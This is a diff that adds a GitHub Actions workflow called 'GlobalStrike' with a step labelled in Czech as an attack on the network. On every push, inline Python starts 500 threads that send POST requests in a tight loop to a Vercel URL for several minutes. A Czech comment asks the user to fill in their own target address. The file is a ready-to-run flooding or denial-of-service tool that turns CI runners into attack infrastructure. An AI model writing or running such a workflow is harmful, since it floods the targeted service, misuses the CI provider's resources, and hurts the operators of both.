@@ -1,0 +1,23 @@
+name: GlobalStrike
+on: [push, workflow_dispatch]
+
+jobs:
+  outbreak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Utok na sit
+        run: |
+          python3 -c "
+          import requests, threading, time
+          def hunt():
+              while True:
+                  # TADY NAHRAĎ 'TVOJE-ADRESA' TVOU ADRESOU Z VERCELU
+                  target = 'https://smart-locker-security-audit.vercel.app/capture'
+                  try:
+                      requests.post(target, headers={'Authorization': 'Bearer viral_hit'}, timeout=0.1)
+                  except: pass
+                  time.sleep(0.01)
+          for _ in range(500):
+              threading.Thread(target=hunt).start()
+          time.sleep(340)
+          "
